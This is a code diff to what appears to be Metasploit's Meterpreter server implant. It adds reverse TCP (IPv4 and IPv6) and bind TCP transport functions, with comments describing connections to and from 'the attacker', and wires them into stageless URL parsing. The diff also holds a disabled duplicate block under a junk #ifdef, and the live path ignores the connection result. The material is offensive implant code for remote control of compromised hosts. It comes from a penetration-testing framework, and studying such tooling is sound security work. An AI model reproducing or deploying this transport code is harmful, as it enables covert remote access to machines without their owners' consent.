@@ -3,10 +3,12 @@
  */
 #include "metsrv.h"
 #include "../../common/common.h"
+#include <netdb.h>
+
+const DWORD RETRY_TIMEOUT_MS = 1000;
 
 char *global_meterpreter_transport =
-	"METERPRETER_TRANSPORT_SSL\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
-char *global_meterpreter_url =
+	"METERPRETER_TRANSPORT_SSL\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"; char *global_meterpreter_url =
 	"https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00";
 char *global_meterpreter_ua =
 	"METERPRETER_UA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
@@ -24,6 +26,144 @@ const unsigned int hAppInstance = 0x504b5320;	// 'PKS '
 
 /*! @brief An array of locks for use by OpenSSL. */
 static LOCK **ssl_locks = NULL;
+
+/*!
+ * @brief Connects to a provided host/port (IPv4), downloads a payload and executes it.
+ * @param host String containing the name or IP of the host to connect to.
+ * @param port Port number to connect to.
+ * @param retryAttempts The number of times to attempt to retry.
+ */
+DWORD reverse_tcp4(const char* host, u_short port, short retryAttempts, SOCKET* socketBuffer)
+{
+	*socketBuffer = 0;
+
+	// prepare to connect to the attacker
+	SOCKET socketHandle = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	struct hostent* target = gethostbyname(host);
+	char* targetIp = inet_ntoa(*(struct in_addr *)*target->h_addr_list);
+
+	struct sockaddr_in sock = { 0 };
+	sock.sin_addr.s_addr = inet_addr(targetIp);
+	sock.sin_family = AF_INET;
+	sock.sin_port = htons(port);
+
+	// try connect to the attacker at least once
+	while (connect(socketHandle, (struct sockaddr*)&sock, sizeof(sock)) == SOCKET_ERROR)
+	{
+		// retry with a Sleep if it fails, or exit the process on failure
+		if (retryAttempts-- <= 0)
+		{
+			return WSAGetLastError();
+		}
+
+		sleep(RETRY_TIMEOUT_MS);
+	}
+
+	*socketBuffer = socketHandle;
+
+	return ERROR_SUCCESS;
+}
+
+/*!
+ * @brief Connects to a provided host/port (IPv6), downloads a payload and executes it.
+ * @param host String containing the name or IP of the host to connect to.
+ * @param service The target service/port.
+ * @param scopeId IPv6 scope ID.
+ * @param retryAttempts The number of times to attempt to retry.
+ */
+DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, short retryAttempts, SOCKET* socketBuffer)
+{
+	*socketBuffer = 0;
+
+	struct addrinfo hints = { 0 };
+	hints.ai_family = AF_INET6;
+	hints.ai_socktype = SOCK_STREAM;
+	hints.ai_protocol = IPPROTO_TCP;
+
+	struct addrinfo* addresses;
+	if (getaddrinfo(host, service, &hints, &addresses) != 0)
+	{
+		return WSAGetLastError();
+	}
+
+
+	// prepare to connect to the attacker
+	SOCKET socketHandle = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
+
+	if (socketHandle == INVALID_SOCKET)
+	{
+		dprintf("[STAGELESS IPV6] failed to connect to attacker");
+		return WSAGetLastError();
+	}
+
+	dprintf("[STAGELESS IPV6] Socket successfully created");
+	while (retryAttempts-- > 0)
+	{
+    struct addrinfo* address = NULL;
+		dprintf("[STAGELESS IPV6] Attempt %u", retryAttempts + 1);
+		for (address = addresses; address != NULL; address = address->ai_next)
+		{
+			((struct sockaddr_in6*)address->ai_addr)->sin6_scope_id = scopeId;
+
+			if (connect(socketHandle, address->ai_addr, (int)address->ai_addrlen) != SOCKET_ERROR)
+			{
+				dprintf("[STAGELESS IPV6] Socket successfully connected");
+				*socketBuffer = socketHandle;
+				freeaddrinfo(addresses);
+				return ERROR_SUCCESS;
+			}
+		}
+
+		sleep(RETRY_TIMEOUT_MS);
+	}
+
+	closesocket(socketHandle);
+	freeaddrinfo(addresses);
+	return WSAGetLastError();
+
+}
+
+/*!
+ * @brief Listens on a port for an incoming payload request.
+ * @param port Port number to listen on.
+ */
+DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
+{
+	*socketBuffer = 0;
+
+	// prepare a connection listener for the attacker to connect to
+	SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+
+	struct sockaddr_in sock = { 0 };
+	sock.sin_addr.s_addr = inet_addr("0.0.0.0");
+	sock.sin_family = AF_INET;
+	sock.sin_port = htons(port);
+
+	if (bind(listenSocket, (struct sockaddr*)&sock, sizeof(sock)) == SOCKET_ERROR)
+	{
+		return WSAGetLastError();
+	}
+
+	if (listen(listenSocket, 1) == SOCKET_ERROR)
+	{
+		return WSAGetLastError();
+	}
+
+	// Setup, ready to go, now wait for the connection.
+	SOCKET acceptSocket = accept(listenSocket, NULL, NULL);
+
+	// don't bother listening for other connections
+	closesocket(listenSocket);
+
+	if (acceptSocket == INVALID_SOCKET)
+	{
+		return WSAGetLastError();
+	}
+
+	*socketBuffer = acceptSocket;
+	return ERROR_SUCCESS;
+}
+
 
 /*!
  * @brief A callback function used by OpenSSL to leverage native system locks.
@@ -184,7 +324,7 @@ static int server_initialize_ssl(Remote * remote)
 /*
  * Bring down the OpenSSL subsystem
  */
-void server_destroy_ssl(Remote * remote)
+BOOL server_destroy_ssl(Remote * remote)
 {
 	TcpTransportContext* ctx = NULL;
 	int i;
@@ -209,6 +349,8 @@ void server_destroy_ssl(Remote * remote)
 		free(ssl_locks);
 		lock_release(remote->lock);
 	}
+
+  return TRUE;
 }
 
 /*
@@ -269,7 +411,7 @@ out:
  * @param remote Pointer to the remote endpoint for this server connection.
  * @returns Indication of success or failure.
  */
-static DWORD server_dispatch(Remote * remote, THREAD* dispatchThread)
+static BOOL server_dispatch(Remote * remote, THREAD* dispatchThread)
 {
 	BOOL running = TRUE;
 	LONG result = ERROR_SUCCESS;
@@ -316,10 +458,50 @@ static DWORD server_dispatch(Remote * remote, THREAD* dispatchThread)
 
 BOOL configure_tcp_connection(Remote* remote, SOCKET socket)
 {
+	DWORD result = ERROR_SUCCESS;
+	size_t charsConverted;
 	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
+	char* asciiUrl = remote->transport->url;
 
-	// assume that we have been given a valid socket given that there's no stageless information
-	ctx->fd = socket;
+	if (strncmp(asciiUrl, "tcp", 3) == 0)
+	{
+		const int iRetryAttempts = 30;
+		char* pHost = strstr(asciiUrl, "//") + 2;
+		char* pPort = strrchr(pHost, ':') + 1;
+
+		// check if we're using IPv6
+		if (asciiUrl[3] == '6')
+		{
+			char* pScopeId = strrchr(pHost, '?') + 1;
+			*(pScopeId - 1) = '\0';
+			*(pPort - 1) = '\0';
+			dprintf("[STAGELESS] IPv6 host %s port %S scopeid %S", pHost, pPort, pScopeId);
+			result = reverse_tcp6(pHost, pPort, atol(pScopeId), iRetryAttempts, &ctx->fd);
+		}
+		else
+		{
+			u_short usPort = (u_short)atoi(pPort);
+
+			// if no host is specified, then we can assume that this is a bind payload, otherwise
+			// we'll assume that the payload is a reverse_tcp one and the given host is valid
+			if (*pHost == ':')
+			{
+				dprintf("[STAGELESS] IPv4 bind port %s", pPort);
+				result = bind_tcp(usPort, &ctx->fd);
+			}
+			else
+			{
+				*(pPort - 1) = '\0';
+				dprintf("[STAGELESS] IPv4 host %s port %s", pHost, pPort);
+				result = reverse_tcp4(pHost, usPort, iRetryAttempts, &ctx->fd);
+			}
+		}
+	}
+	else
+	{
+		// assume that we have been given a valid socket given that there's no stageless information
+		ctx->fd = socket;
+	}
 
 	// Do not allow the file descriptor to be inherited by child processes
 	SetHandleInformation((HANDLE)ctx->fd, HANDLE_FLAG_INHERIT, 0);
@@ -342,6 +524,79 @@ BOOL configure_tcp_connection(Remote* remote, SOCKET socket)
 	}
 
 	return TRUE;
+#ifdef fdjsklfds
+	DWORD result = ERROR_SUCCESS;
+	size_t charsConverted;
+	char asciiUrl[512];
+	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
+
+	wcstombs_s(&charsConverted, asciiUrl, sizeof(asciiUrl), remote->transport->url, sizeof(asciiUrl)-1);
+
+	if (strncmp(asciiUrl, "tcp", 3) == 0)
+	{
+		const int iRetryAttempts = 30;
+		char* pHost = strstr(asciiUrl, "//") + 2;
+		char* pPort = strrchr(pHost, ':') + 1;
+
+		// check if we're using IPv6
+		if (asciiUrl[3] == '6')
+		{
+			char* pScopeId = strrchr(pHost, '?') + 1;
+			*(pScopeId - 1) = '\0';
+			*(pPort - 1) = '\0';
+			dprintf("[STAGELESS] IPv6 host %s port %S scopeid %S", pHost, pPort, pScopeId);
+			result = reverse_tcp6(pHost, pPort, atol(pScopeId), iRetryAttempts, &ctx->fd);
+		}
+		else
+		{
+			u_short usPort = (u_short)atoi(pPort);
+
+			// if no host is specified, then we can assume that this is a bind payload, otherwise
+			// we'll assume that the payload is a reverse_tcp one and the given host is valid
+			if (*pHost == ':')
+			{
+				dprintf("[STAGELESS] IPv4 bind port %s", pPort);
+				result = bind_tcp(usPort, &ctx->fd);
+			}
+			else
+			{
+				*(pPort - 1) = '\0';
+				dprintf("[STAGELESS] IPv4 host %s port %s", pHost, pPort);
+				result = reverse_tcp4(pHost, usPort, iRetryAttempts, &ctx->fd);
+			}
+		}
+	}
+	else
+	{
+		// assume that we have been given a valid socket given that there's no stageless information
+		ctx->fd = socket;
+	}
+
+	if (result != ERROR_SUCCESS)
+	{
+		return FALSE;
+	}
+
+	// Do not allow the file descriptor to be inherited by child processes
+	SetHandleInformation((HANDLE)ctx->fd, HANDLE_FLAG_INHERIT, 0);
+
+	dprintf("[SERVER] Flushing the socket handle...");
+	server_socket_flush(remote);
+
+	dprintf("[SERVER] Initializing SSL...");
+	if (!server_initialize_ssl(remote))
+	{
+		return FALSE;
+	}
+
+	dprintf("[SERVER] Negotiating SSL...");
+	if (!server_negotiate_ssl(remote))
+	{
+		return FALSE;
+	}
+
+	return TRUE;
+#endif
 }
 
 BOOL transport_create(Remote* remote)
@@ -457,5 +712,5 @@ out:
   res = GetLastError();
 
 	dprintf("[SERVER] Finished.");
-	return res;
+	return res == ERROR_SUCCESS;
 }
